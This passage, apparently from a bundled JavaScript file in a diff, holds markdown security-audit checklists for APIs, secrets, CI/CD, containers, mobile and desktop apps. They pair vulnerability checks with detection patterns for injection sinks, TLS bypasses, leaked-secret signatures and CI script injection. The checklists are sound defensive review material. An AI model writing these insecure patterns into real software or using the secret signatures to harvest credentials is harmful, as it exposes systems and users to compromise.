revoked | no session id rotation on login; logout doesn\'t invalidate; refresh tokens not rotated | S, R | Medium | CWE-384, CWE-613 |\n| API-AUN-09 | OAuth / OIDC server-side flaws | redirect_uri not exact-matched, state not checked, ID token not validated | S, A | High | CWE-601 |\n| API-AUN-10 | MFA bypass | MFA step skippable by calling the next endpoint directly | R, A | High | CWE-287 |\n| API-AUN-11 | Timing-unsafe comparison | `==` on tokens/HMACs instead of constant-time compare | S | Low | CWE-208 |\n\n## 2. Authorization\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| API-AUZ-01 | IDOR / BOLA | objects fetched by id from the request without owner/tenant check | S, A, R | Critical | API1, CWE-639 |\n| API-AUZ-02 | Function-level authz missing | admin/staff endpoints callable by normal users | S, R | Critical | API5, CWE-285 |\n| API-AUZ-03 | Mass assignment | request body bound straight to models (`role`, `isAdmin`, `ownerId`, `price`) | S, R | High | API3, CWE-915 |\n| API-AUZ-04 | Excessive data exposure | whole model serialised (password hash, tokens, internal fields) | S, R | High | API3, CWE-213 |\n| API-AUZ-05 | Multi-tenant isolation | queries missing `tenant_id` scope; RLS disabled | S, A | Critical | CWE-284 |\n| API-AUZ-06 | Authorization matrix test | each endpoint \xD7 each role (anon, user A, user B, admin) behaves as intended | R | \u2014 | WSTG-ATHZ |\n| API-AUZ-07 | GraphQL field/resolver authz | auth only at the query root, nested resolvers unchecked | S, A | High | API1 |\n\n## 3. Injection\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| API-INJ-01 | SQL injection | string-built SQL, raw queries with interpolation, ORM `raw`/`extra`/`whereRaw` with input | S, R | Critical | CWE-89 |\n| API-INJ-02 | NoSQL injection | Mongo queries from raw request objects (`{$ne: null}`), `$where` | S, R | High | CWE-943 |\n| API-INJ-03 | Command injection | `exec`, `system`, `subprocess(shell=True)`, `Runtime.exec` with input | S | Critical | CWE-78 |\n| API-INJ-04 | Server-side template injection | rendering templates built from user strings (Jinja `from_string`, Thymeleaf expressions, EJS/Handlebars compile) | S | Critical | CWE-1336 |\n| API-INJ-05 | LDAP / XPath injection | filters built from input | S | High | CWE-90, CWE-643 |\n| API-INJ-06 | Header / log injection | CRLF in headers, unescaped input in logs | S | Low | CWE-113, CWE-117 |\n| API-INJ-07 | Code eval | `eval`, `vm.runInContext`, `exec()` (Python), `ScriptEngine` on input | S | Critical | CWE-95 |\n| API-INJ-08 | Prompt injection in LLM features | user/retrieved content mixed into tool-using prompts; model output executed or trusted for authz | A | High | OWASP LLM01 |\n\n## 4. Server-side requests, files & parsing\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| API-SRV-01 | SSRF | server fetching user-supplied URLs (webhooks, previews, imports) without allowlist / metadata-IP block | S, R | High | API7, CWE-918 |\n| API-SRV-02 | Path traversal | file paths joined from input without canonical check | S, R | High | CWE-22 |\n| API-SRV-03 | Unrestricted upload | no type/size checks; uploads stored in web root; executable extensions | S, R | High | CWE-434 |\n| API-SRV-04 | Insecure deserialization | `pickle`, `yaml.load`, Java `ObjectInputStream`, .NET `BinaryFormatter`, PHP `unserialize` on input | S | Critical | CWE-502 |\n| API-SRV-05 | XXE | XML parsers with external entities enabled | S | High | CWE-611 |\n| API-SRV-06 | Zip slip / archive bombs | extracting archives without path and size limits | S | High | CWE-22, CWE-409 |\n| API-SRV-07 | Open redirect | `redirect(req.query.next)` | S, R | Medium | CWE-601 |\n| API-SRV-08 | ReDoS | catastrophic regexes on request input | S | Medium | CWE-1333 |\n\n## 5. Transport, CORS & headers\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| API-HTTP-01 | CORS too open | `Access-Control-Allow-Origin: *` with credentials; origin reflected; regex allowing `evil-example.com` | S, R | High | CWE-942 |\n| API-HTTP-02 | CSRF on cookie-auth endpoints | no CSRF middleware / SameSite on state-changing routes | S, R | High | CWE-352 |\n| API-HTTP-03 | TLS verification off for outbound calls | `verify=False`, `rejectUnauthorized: false`, `InsecureSkipVerify: true` | S | High | CWE-295 |\n| API-HTTP-04 | Security headers missing | for HTML responses: CSP, HSTS, X-Content-Type-Options, frame-ancestors | R | Low | \u2014 |\n| API-HTTP-05 | Cookie flags | session cookies without `Secure`/`HttpOnly`/`SameSite` | S, R | Medium | CWE-614 |\n| API-HTTP-06 | HTTP method confusion | GET handlers that change state; method override headers honoured | S | Medium | CWE-650 |\n\n## 6. Rate limits & resource use\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| API-RES-01 | No rate limiting | public and auth endpoints without limits | S, R | Medium | API4 |\n| API-RES-02 | Unbounded queries | no pagination max, `limit` from input unbounded | S, R | Medium | API4, CWE-770 |\n| API-RES-03 | Body / upload size unbounded | no body size limit, multipart limits | S | Medium | CWE-400 |\n| API-RES-04 | GraphQL depth / complexity | no depth limit, introspection on in production, batching abuse | S, R | Medium | API4 |\n| API-RES-05 | Expensive ops for anonymous users | email/SMS sending, PDF generation, LLM calls without auth or quota | A | Medium | API6 |\n\n## 7. Business logic\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| API-BIZ-01 | Price / quantity tampering | prices, discounts, totals taken from the client | A, R | High | API6, CWE-840 |\n| API-BIZ-02 | Negative / overflow values | negative quantities, transfers, refunds | A, R | High | CWE-191 |\n| API-BIZ-03 | Race conditions | double-spend, coupon reuse, balance checks without locking/transactions | A, R | High | CWE-362 |\n| API-BIZ-04 | Workflow step skipping | finishing checkout/onboarding/verification by calling the last step | R, A | High | CWE-841 |\n| API-BIZ-05 | Webhook authenticity | incoming webhooks (Stripe, GitHub\u2026) without signature verification | S | High | CWE-345 |\n| API-BIZ-06 | Idempotency | payment/create endpoints without idempotency keys | A | Low | \u2014 |\n\n## 8. Errors, logging & monitoring\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| API-LOG-01 | Stack traces / debug pages exposed | `DEBUG=True`, `app.debug`, Spring whitelabel with traces, Express default error handler in prod | S, R | Medium | CWE-209 |\n| API-LOG-02 | Secrets / PII in logs | logging request bodies, headers (`Authorization`), passwords | S | Medium | CWE-532 |\n| API-LOG-03 | No audit log for security events | logins, permission changes, admin actions not logged | A | Low | CWE-778 |\n| API-LOG-04 | Debug / admin endpoints exposed | Spring Actuator `/env`, `/heapdump`; Django admin on default path; `/debug/pprof`; phpinfo | S, R | High | CWE-489 |\n\n## 9. Data protection\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| API-DAT-01 | Sensitive fields unencrypted at rest | tokens, national ids, API keys of customers stored in plaintext columns | S, A | Medium | CWE-312 |\n| API-DAT-02 | Weak crypto | ECB, static IV, MD5/SHA-1 signatures, `Math.random`/`random` for tokens | S | High | CWE-327, CWE-338 |\n| API-DAT-03 | Secrets from env with insecure defaults | `process.env.SECRET \\|\\| \'dev\'` | S | High | CWE-1188 |\n| API-DAT-04 | Backups / exports unprotected | DB dumps in public buckets or web root | S, A | High | CWE-530 |\n\n## 10. Inventory\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| API-INV-01 | Shadow / old API versions | `/v1` still live without the fixes of `/v2`; test routes in production | S, A | Medium | API9 |\n| API-INV-02 | Unsafe consumption of third-party APIs | trusting responses from partners without validation; following their redirects | A | Medium | API10 |\n| API-INV-03 | OpenAPI spec vs. code drift | endpoints in code missing from spec (unreviewed surface) | S | Info | API9 |\n\n## 11. Language / framework patterns\n\nWhat the static rules match for each stack. Each row points back to a check above.\n\n### Node.js / TypeScript (Express, Nest, Fastify, Next.js)\n| Pattern | Check |\n|---|---|\n| `` db.query(`\u2026 ${x}`) ``, `sequelize.query` with interpolation, Prisma `$queryRawUnsafe`, Knex `whereRaw(x)` | API-INJ-01 |\n| `Model.find(req.body)`, `findOne({ email: req.body.email })` without type check | API-INJ-02 |\n| `child_process.exec(` with input, `shell: true` | API-INJ-03 |\n| `jwt.decode(` used for auth, `algorithms` not set in `jwt.verify` | API-AUN-03 |\n| `cors({ origin: true, credentials: true })`, `origin: \'*\'` + credentials | API-HTTP-01 |\n| `rejectUnauthorized: false`, `NODE_TLS_REJECT_UNAUTHORIZED=0` | API-HTTP-03 |\n| `res.redirect(req.query.*)` | API-SRV-07 |\n| Next.js server actions / route handlers without session check; `"use server"` functions trusting args | API-AUN-01, API-AUZ-01 |\n| Nest controllers without `@UseGuards` where siblings have it | API-AUN-01 |\n| `express.json()` without `limit`, no `helmet` | API-RES-03, API-HTTP-04 |\n| `vm.runInNewContext`, `eval`, `new Function` on input | API-INJ-07 |\n| `Object.assign(user, req.body)`, `prisma.user.update({ data: req.body })` | API-AUZ-03 |\n\n### Python (Django, Flask, FastAPI)\n| Pattern | Check |\n|---|---|\n| `cursor.execute(f"\u2026")`, `.raw(`, `.extra(`, SQLAlchemy `text(f"\u2026")` | API-INJ-01 |\n| `subprocess.*(shell=True)`, `os.system`, `os.popen` | API-INJ-03 |\n| `pickle.loads`, `yaml.load` without `SafeLoader`, `marshal`, `shelve` | API-SRV-04 |\n| `DEBUG = True`, `ALLOWED_HOSTS = [\'*\']`, `SECRET_KEY` literal | API-LOG-01, API-AUN-04 |\n| `@csrf_exempt`, `CSRF_COOKIE_SECURE = False`, `SESSION_COOKIE_SECURE = False` | API-HTTP-02, API-HTTP-05 |\n| `render_template_string(`, `Template(user)` | API-INJ-04 |\n| `requests.*(verify=False)` | API-HTTP-03 |\n| FastAPI routes without `Depends(auth)` where siblings have it | API-AUN-01 |\n| `ModelSerializer` with `fields = \'__all__\'` | API-AUZ-03, API-AUZ-04 |\n| `lxml` / `xml.etree` on untrusted input (use defusedxml) | API-SRV-05 |\n\n### JVM (Spring Boot, Ktor, Micronaut)\n| Pattern | Check |\n|---|---|\n| `"SELECT \u2026 " + x` in `JdbcTemplate`, `createQuery`/`createNativeQuery` concatenation | API-INJ-01 |\n| `permitAll()` on sensitive matchers, `csrf().disable()` with cookie sessions | API-AUZ-02, API-HTTP-02 |\n| `management.endpoints.web.exposure.include=*` | API-LOG-04 |\n| `ObjectInputStream`, Jackson `enableDefaultTyping` / `@JsonTypeInfo(use = CLASS)`, XStream | API-SRV-04 |\n| `DocumentBuilderFactory` without `disallow-doctype-decl` | API-SRV-05 |\n| `@CrossOrigin("*")` with credentials | API-HTTP-01 |\n| `@RequestBody Entity` bound directly to JPA entities | API-AUZ-03 |\n| SpEL `parseExpression(input)`, Thymeleaf `__${\u2026}__` | API-INJ-04 |\n| Ktor routes outside `authenticate { }` | API-AUN-01 |\n\n### Go\n| Pattern | Check |\n|---|---|\n| `db.Query(fmt.Sprintf(\u2026))`, `db.Exec("\u2026" + x)` | API-INJ-01 |\n| `exec.Command("sh", "-c", x)` | API-INJ-03 |\n| `InsecureSkipVerify: true` | API-HTTP-03 |\n| `text/template` for HTML, `template.HTML(input)` | WEB-XSS / API-INJ-04 |\n| `filepath.Join(base, userPath)` without `filepath.Rel`/prefix check | API-SRV-02 |\n| `net/http/pprof` imported in prod build | API-LOG-04 |\n| `http.ListenAndServe` without timeouts (slowloris) | API-RES-03 |\n| `math/rand` for tokens | API-DAT-02 |\n\n### .NET (ASP.NET Core)\n| Pattern | Check |\n|---|---|\n| `FromSqlRaw($"\u2026")`, `SqlCommand` with concatenation | API-INJ-01 |\n| controllers/actions without `[Authorize]` or with `[AllowAnonymous]` on sensitive actions | API-AUN-01 |\n| `BinaryFormatter`, `TypeNameHandling.All` (Newtonsoft) | API-SRV-04 |\n| `[IgnoreAntiforgeryToken]`, missing `ValidateAntiForgeryToken` | API-HTTP-02 |\n| `ServerCertificateCustomValidationCallback = (\u2026) => true` | API-HTTP-03 |\n| `app.UseDeveloperExceptionPage()` outside Development | API-LOG-01 |\n| `AllowAnyOrigin().AllowCredentials()` patterns | API-HTTP-01 |\n\n### PHP (Laravel, Symfony, plain)\n| Pattern | Check |\n|---|---|\n| `DB::raw`, `whereRaw`, `mysqli_query` with `$_GET`/`$_POST` | API-INJ-01 |\n| `unserialize($_\u2026)`, phar:// wrappers | API-SRV-04 |\n| `include/require` with input (LFI/RFI) | API-SRV-02 |\n| `system`, `exec`, `shell_exec`, backticks | API-INJ-03 |\n| `$fillable` missing / `$guarded = []` | API-AUZ-03 |\n| `APP_DEBUG=true` in production env, `phpinfo()` | API-LOG-01, API-LOG-04 |\n| `==` comparisons on hashes (type juggling) | API-AUN-11 |\n\n### Ruby (Rails)\n| Pattern | Check |\n|---|---|\n| `where("\u2026 #{x}")`, `find_by_sql` interpolation | API-INJ-01 |\n| `params.permit!`, missing strong params | API-AUZ-03 |\n| `Marshal.load`, `YAML.load` (unsafe) | API-SRV-04 |\n| `skip_before_action :verify_authenticity_token` | API-HTTP-02 |\n| `html_safe`, `raw` on user input | WEB-XSS-01 |\n| `redirect_to params[:url]` | API-SRV-07 |\n| `system`, backticks, `Open3` with input | API-INJ-03 |\n';
+
+// docs/security/common.md
+var common_default = '# Common security checks (every project)\n\nThese run on any project regardless of platform: secrets, dependencies, repository hygiene, CI/CD, containers and infrastructure, and privacy. Platform files add their own checks on top.\n\nHow: **S** static, **D** dependencies, **G** git history, **A** agent review.\n\n## 1. Secrets\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| COM-SEC-01 | Cloud / provider keys in code | AWS `AKIA\u2026`, GCP service-account JSON, Azure connection strings, Stripe `sk_live_`, OpenAI/Anthropic keys, Slack/GitHub tokens, Twilio, SendGrid | S | Critical | CWE-798 |\n| COM-SEC-02 | Private keys in repo | `-----BEGIN (RSA\\|EC\\|OPENSSH\\|PRIVATE) KEY-----`, `.pem`, `.p8`, `.p12`, `.pfx`, `.jks`, `.keystore` | S | Critical | CWE-321 |\n| COM-SEC-03 | Env files committed | `.env`, `.env.production`, `secrets.properties`, `local.properties` with secrets tracked by git | S | High | CWE-538 |\n| COM-SEC-04 | High-entropy strings near secret-like names | `password=`, `secret=`, `token=`, `apiKey` with long literals | S | Medium | CWE-798 |\n| COM-SEC-05 | Secrets in git history | secrets removed from HEAD but present in past commits | G | High | CWE-540 |\n| COM-SEC-06 | `.gitignore` gaps | no ignore for `.env*`, `*.jks`, `*.pem`, `secrets.*` | S | Low | \u2014 |\n| COM-SEC-07 | Test keys mislabeled as prod (or vice versa) | `pk_test_` in a `*_PROD` variable, live keys in test config | S | Info | \u2014 |\n| COM-SEC-08 | Secrets in docs / samples | keys in README, docs, Postman collections, `.http` files, notebooks | S | High | CWE-798 |\n| COM-SEC-09 | Shipped secret must be rotated | any secret that reached a released build or public repo | A | \u2014 | \u2014 |\n\n## 2. Dependencies & supply chain\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| COM-DEP-01 | Known vulnerabilities | OSV / GitHub Advisory matches for npm, Maven/Gradle, PyPI, Go, Cargo, NuGet, Pub, CocoaPods, SwiftPM, Composer, RubyGems | D | by CVE | CWE-1104 |\n| COM-DEP-02 | Unmaintained packages | no release in 2+ years, archived repos, deprecated packages | D | Low | CWE-1104 |\n| COM-DEP-03 | No lockfile / lockfile drift | missing `package-lock.json`, `poetry.lock`, `gradle.lockfile`; lockfile out of sync | S | Low | CWE-829 |\n| COM-DEP-04 | Unpinned / dynamic versions | `latest`, `*`, `+` (Gradle), `>=` ranges, git dependencies on branches | S | Medium | CWE-829 |\n| COM-DEP-05 | Typosquat / suspicious names | names close to popular packages; new packages with install scripts | D | High | CWE-506 |\n| COM-DEP-06 | Install scripts | `preinstall`/`postinstall` in dependencies | D | Low | CWE-506 |\n| COM-DEP-07 | Untrusted registries / repos | `http://` Maven repos, `jitpack` for critical libs, extra npm registries, dependency confusion with private names | S | Medium | CWE-829 |\n| COM-DEP-08 | License risk | GPL/AGPL/SSPL in closed-source or distributed apps | D | Info | \u2014 |\n| COM-DEP-09 | Vendored copies of libraries | old copies of jQuery, OpenSSL, etc. checked into the repo | S | Medium | CWE-1104 |\n| COM-DEP-10 | SBOM | generate CycloneDX/SPDX per release | D | Info | \u2014 |\n\n## 3. CI/CD\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| COM-CI-01 | Untrusted code with secrets | GitHub `pull_request_target` checking out PR head; GitLab pipelines on unprotected/fork refs with unprotected variables | S | Critical | CWE-829 |\n| COM-CI-02 | Script injection | `${{ github.event.issue.title }}` / PR body / branch name interpolated into `run:` | S | High | CWE-78 |\n| COM-CI-03 | Actions not pinned to SHA | `uses: owner/action@v1` / `@main` for third-party actions | S | Medium | CWE-829 |\n| COM-CI-04 | Token permissions too broad | no `permissions:` block (write-all default), `contents: write` everywhere | S | Medium | CWE-250 |\n| COM-CI-05 | Secrets printed to logs | `echo $SECRET`, `set -x` with secrets, `env` dumps | S | High | CWE-532 |\n| COM-CI-06 | Self-hosted runners on public repos | `runs-on: self-hosted` with fork PRs | S | High | CWE-250 |\n| COM-CI-07 | Artifacts contain secrets | uploading build dirs with `.env`, keystores, `google-services.json` | S | Medium | CWE-538 |\n| COM-CI-08 | Release signing in CI insecure | keystore/password as plain variables, available to all branches | S | High | CWE-522 |\n| COM-CI-09 | No security gate | no dependency/secret scan in CI | S | Info | \u2014 |\n\n## 4. Containers & infrastructure as code\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| COM-IAC-01 | Container runs as root | no `USER` in Dockerfile | S | Medium | CWE-250 |\n| COM-IAC-02 | Unpinned base image | `FROM image:latest` or tag without digest | S | Low | CWE-829 |\n| COM-IAC-03 | Secrets in image | `COPY .env`, `ARG`/`ENV` with secrets, keys in layers | S | High | CWE-538 |\n| COM-IAC-04 | Over-exposed ports / services | docker-compose DB/Redis ports bound to `0.0.0.0`; default passwords | S | High | CWE-1188 |\n| COM-IAC-05 | Privileged containers | `privileged: true`, `hostNetwork`, `hostPath` mounts, `docker.sock` mounted, `allowPrivilegeEscalation` | S | High | CWE-250 |\n| COM-IAC-06 | Public storage | S3/GCS/Azure blobs public, `acl = "public-read"` | S | Critical | CWE-284 |\n| COM-IAC-07 | Open security groups | `0.0.0.0/0` on SSH/RDP/DB ports | S | High | CWE-284 |\n| COM-IAC-08 | Encryption off | unencrypted RDS/EBS/buckets, TLS off on load balancers | S | Medium | CWE-311 |\n| COM-IAC-09 | IAM wildcards | `"Action": "*"`, `"Resource": "*"` | S | High | CWE-250 |\n| COM-IAC-10 | K8s secrets in manifests | `Secret` objects with real values committed; secrets in ConfigMaps | S | High | CWE-538 |\n| COM-IAC-11 | Missing resource limits / probes | pods without limits (DoS on neighbours) | S | Low | CWE-770 |\n\n## 5. Privacy & compliance (any app handling personal data)\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| COM-PRV-01 | PII inventory | which features collect email, phone, location, contacts, health, payment data | A | Info | GDPR Art. 30 |\n| COM-PRV-02 | PII sent to third parties | analytics/crash/ads SDKs and APIs receiving PII | S, A | Medium | MASVS-PRIVACY |\n| COM-PRV-03 | Data retention / deletion | no account deletion path; data never purged | A | Medium | GDPR Art. 17 |\n| COM-PRV-04 | Store disclosures mismatch | Play Data Safety / App Store privacy labels vs. actual collection | A | Low | \u2014 |\n| COM-PRV-05 | Payment card data handled directly | card numbers touching your code/servers instead of the provider\'s SDK (PCI scope) | S, A | High | PCI DSS |\n\n## 6. Repository & process hygiene\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| COM-REP-01 | No SECURITY.md / disclosure policy | missing security contact | S | Info | \u2014 |\n| COM-REP-02 | Dependabot/Renovate absent | no automated dependency updates | S | Info | \u2014 |\n| COM-REP-03 | Large binaries / dumps committed | DB dumps, logs, `.har` files with real data | S | High | CWE-538 |\n| COM-REP-04 | Security-relevant TODOs | `TODO: auth`, `FIXME: validate`, `HACK` near auth/crypto code | S | Info | \u2014 |\n';
+
+// docs/security/cross-platform-mobile.md
+var cross_platform_mobile_default = '# Cross-platform mobile security checks\n\nApplies to: Flutter, React Native (incl. Expo), Kotlin Multiplatform, .NET MAUI / Xamarin, Ionic / Capacitor / Cordova.\nThese apps still ship as an Android APK and an iOS IPA, so **every check in [android.md](android.md) and [ios.md](ios.md) also applies** to the native shells. This file adds what is specific to each framework.\n\nHow: **S** static, **D** dependencies, **B** built app, **R** runtime, **A** agent review.\n\n## 1. Shared across frameworks\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| XPM-01 | Secrets in the JS/Dart/C# bundle | keys in `.env` files baked by `react-native-config`, `flutter_dotenv`, `--dart-define`, `app.json`/`app.config.js` `extra` | S, B | Critical | CWE-798 |\n| XPM-02 | Insecure storage plugin | `AsyncStorage`, `shared_preferences`, `Preferences` (Capacitor), `Xamarin.Essentials.Preferences` for tokens | S | Critical | CWE-312 |\n| XPM-03 | Secure storage plugin misconfigured | `flutter_secure_storage` / `react-native-keychain` / `expo-secure-store` with weak accessibility options | S | Medium | MASVS-STORAGE |\n| XPM-04 | TLS bypass in framework HTTP client | Dio `badCertificateCallback = (\u2026) => true`, `HttpClient` override, RN fetch with custom trust | S | Critical | CWE-295 |\n| XPM-05 | No pinning on sensitive hosts | no `ssl_pinning`/`http_certificate_pinning`/`react-native-ssl-pinning` where expected | S | Medium | MASVS-NETWORK |\n| XPM-06 | Over-the-air updates unsigned | CodePush / EAS Update / Shorebird without code signing; update URL over HTTP | S | High | CWE-494 |\n| XPM-07 | Dev menus / debug in release | RN dev menu, Flipper, Flutter `debugPrint`/`kDebugMode` gates missing | S, B | Medium | CWE-489 |\n| XPM-08 | Native plugin with risky permissions | plugins adding permissions or exported components to the merged manifest | B | Medium | CWE-926 |\n| XPM-09 | Deep-link handling in shared code | `Linking`/`go_router`/`uni_links` routes performing actions or opening URLs without validation | S, A | High | CWE-20 |\n| XPM-10 | Logs in shared code | `console.log`, `print`, `debugPrint` with tokens/PII in release | S | Medium | CWE-532 |\n| XPM-11 | Obfuscation off | Flutter without `--obfuscate --split-debug-info`; Hermes bytecode not used; source maps shipped in bundle | B | Low | MASVS-RESILIENCE |\n\n## 2. React Native / Expo\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| XRN-01 | `react-native-webview` with bridge open | `onMessage` handlers without origin check; `originWhitelist={[\'*\']}`; `injectedJavaScript` with input | S | High | CWE-749 |\n| XRN-02 | WebView file access | `allowFileAccess`, `allowUniversalAccessFromFileURLs`, `mixedContentMode="always"` | S | High | CWE-200 |\n| XRN-03 | JS bundle readable | plain `index.android.bundle` with business logic and keys | B | Low | \u2014 |\n| XRN-04 | Expo config leaks | secrets in `app.json` `extra`, `expo-constants` | S, B | High | CWE-798 |\n| XRN-05 | `eval` of remote code | `eval`/`Function` on server strings | S | High | CWE-95 |\n\n## 3. Flutter\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| XFL-01 | `webview_flutter` JS channels open | `JavaScriptChannel` + `JavaScriptMode.unrestricted` on non-allowlisted URLs | S | High | CWE-749 |\n| XFL-02 | `--dart-define` secrets | secrets passed at build time end up in `libapp.so` | S, B | High | CWE-798 |\n| XFL-03 | Platform channels trust input | `MethodChannel` handlers doing file/intent/URL work from unvalidated args | S, A | Medium | CWE-20 |\n| XFL-04 | Release built in debug/profile | APK built with `--debug`/`--profile` distributed | B | Medium | CWE-489 |\n\n## 4. Kotlin Multiplatform\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| XKM-01 | Platform storage `expect/actual` insecure on one side | secure on Android (Keystore), plain `NSUserDefaults` on iOS or vice versa (`multiplatform-settings` without encryption) | S, A | High | CWE-312 |\n| XKM-02 | Ktor client TLS overrides | custom `engine { https { trustManager = \u2026 } }` / Darwin `handleChallenge` accepting all | S | Critical | CWE-295 |\n| XKM-03 | Shared logging (Napier, Kermit) in release | log levels not gated per platform | S | Low | CWE-532 |\n\n## 5. Ionic / Capacitor / Cordova\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| XHY-01 | Whole app is a WebView | all [web-frontend.md](web-frontend.md) XSS checks apply, with native plugin access as impact | S | High | CWE-79 |\n| XHY-02 | Cordova `<access origin="*">` / `allow-navigation *` | open whitelist | S | High | CWE-939 |\n| XHY-03 | Capacitor `server.url` / `cleartext: true` in release | live-reload config shipped | S, B | High | CWE-319 |\n| XHY-04 | Old Cordova platforms / plugins | known CVEs in `cordova-android`, `cordova-plugin-inappbrowser` | D | Medium | CWE-1104 |\n| XHY-05 | No CSP in `index.html` | missing `Content-Security-Policy` meta | S | Medium | CWE-693 |\n\n## 6. .NET MAUI / Xamarin\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| XMA-01 | `ServerCertificateCustomValidationCallback` returns true | TLS bypass | S | Critical | CWE-295 |\n| XMA-02 | Assemblies not linked/obfuscated | DLLs in APK readable with ILSpy, holding secrets | B | Medium | CWE-798 |\n| XMA-03 | `Preferences` for tokens | instead of `SecureStorage` | S | High | CWE-312 |\n';
+
+// docs/security/desktop.md
+var desktop_default = "# Desktop app security checks\n\nApplies to: Electron, Tauri, and native desktop apps (Windows .NET/WPF/WinUI, macOS AppKit/SwiftUI, Qt, Java/Compose Desktop).\nShared checks in [common.md](common.md). Electron/Tauri renderers are web pages, so [web-frontend.md](web-frontend.md) XSS checks apply too \u2014 with much bigger impact, because XSS can become code execution.\n\nHow: **S** static, **D** dependencies, **B** built package, **R** runtime, **A** agent review.\n\n## 1. Electron\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| DSK-EL-01 | Node integration in renderer | `nodeIntegration: true`, `nodeIntegrationInWorker`, `nodeIntegrationInSubFrames` | S | Critical | CWE-94 |\n| DSK-EL-02 | Context isolation off | `contextIsolation: false` | S | Critical | CWE-653 |\n| DSK-EL-03 | Sandbox off | `sandbox: false` on windows loading remote content | S | High | CWE-653 |\n| DSK-EL-04 | Web security off | `webSecurity: false`, `allowRunningInsecureContent: true`, `experimentalFeatures` | S | High | CWE-693 |\n| DSK-EL-05 | Preload exposes too much | `contextBridge.exposeInMainWorld` exposing `ipcRenderer`, `require`, `fs`, or generic `invoke(channel, \u2026)` | S, A | High | CWE-749 |\n| DSK-EL-06 | IPC handlers trust renderer | `ipcMain.handle` doing file/shell/network work without validating args or `event.senderFrame` origin | S, A | High | CWE-20 |\n| DSK-EL-07 | `shell.openExternal` with untrusted URLs | no scheme allowlist (`file:`, `smb:`, custom protocols \u2192 RCE) | S | High | CWE-78 |\n| DSK-EL-08 | Navigation / new windows not restricted | no `will-navigate` / `setWindowOpenHandler` limits | S | Medium | CWE-939 |\n| DSK-EL-09 | Remote content loaded | `loadURL('http\u2026')` of remote sites in privileged windows; `<webview>` tag enabled | S | High | CWE-829 |\n| DSK-EL-10 | No CSP | renderer pages without CSP | S, R | Medium | CWE-693 |\n| DSK-EL-11 | `@electron/remote` / `enableRemoteModule` | remote module in use | S | High | \u2014 |\n| DSK-EL-12 | Custom protocol handlers | `protocol.registerFileProtocol` serving paths without traversal checks; `setAsDefaultProtocolClient` handlers parsing argv unsafely | S | High | CWE-22 |\n| DSK-EL-13 | Outdated Electron | Electron major out of support (Chromium CVEs) | D | High | CWE-1104 |\n| DSK-EL-14 | Fuses not hardened | `RunAsNode`, `EnableNodeCliInspectArguments`, `EnableNodeOptionsEnvironmentVariable` on; ASAR integrity off | B | Medium | CWE-693 |\n| DSK-EL-15 | DevTools in production | `openDevTools()` not gated | S | Low | CWE-489 |\n\n## 2. Tauri\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| DSK-TA-01 | Capabilities too broad | `fs:allow-*` on `$HOME/**`, `shell:allow-execute` with open args, `http` scope `*` | S | High | CWE-250 |\n| DSK-TA-02 | Commands trust frontend | `#[tauri::command]` doing file/shell work with unvalidated args | S, A | High | CWE-20 |\n| DSK-TA-03 | CSP disabled | `\"csp\": null` in `tauri.conf.json` | S | Medium | CWE-693 |\n| DSK-TA-04 | Remote URLs given IPC access | `remote` domains in capabilities | S | High | CWE-829 |\n| DSK-TA-05 | Dangerous `asset:` / `convertFileSrc` scope | asset protocol scope over the whole disk | S | Medium | CWE-22 |\n\n## 3. Native desktop (all OSes)\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| DSK-NT-01 | Secrets stored in plain files / registry | tokens in config files, `%APPDATA%`, `~/Library/Preferences`, registry instead of DPAPI / Keychain / libsecret | S, R | High | CWE-312 |\n| DSK-NT-02 | Auto-update insecure | update feed over HTTP, unsigned updates, signature not verified (Squirrel, Sparkle without EdDSA, custom updaters) | S | Critical | CWE-494 |\n| DSK-NT-03 | DLL / dylib hijacking | loading libraries by relative name; `LoadLibrary` without full path; `@rpath` to writable dirs | S, B | High | CWE-427 |\n| DSK-NT-04 | Writable install directory | app installed per-machine with user-writable files; services running as SYSTEM from writable paths | B, R | High | CWE-276 |\n| DSK-NT-05 | Local IPC / ports open | named pipes, Unix sockets, localhost HTTP servers without auth (any local process or website via DNS rebinding can call them) | S, R | High | CWE-306 |\n| DSK-NT-06 | Custom URL scheme handlers | `myapp://` arguments passed to shell/file APIs | S | High | CWE-78 |\n| DSK-NT-07 | Unsigned binaries / no notarization | missing Authenticode / Apple notarization; hardened runtime off | B | Medium | \u2014 |\n| DSK-NT-08 | macOS entitlements too broad | `com.apple.security.cs.disable-library-validation`, `allow-unsigned-executable-memory`, `allow-dyld-environment-variables` | B | Medium | CWE-693 |\n| DSK-NT-09 | Temp files insecure | predictable temp file names, world-readable temp files with secrets | S | Medium | CWE-377 |\n| DSK-NT-10 | Memory-unsafe code | C/C++ `strcpy`, `sprintf`, unchecked buffers | S | Medium | CWE-120 |\n| DSK-NT-11 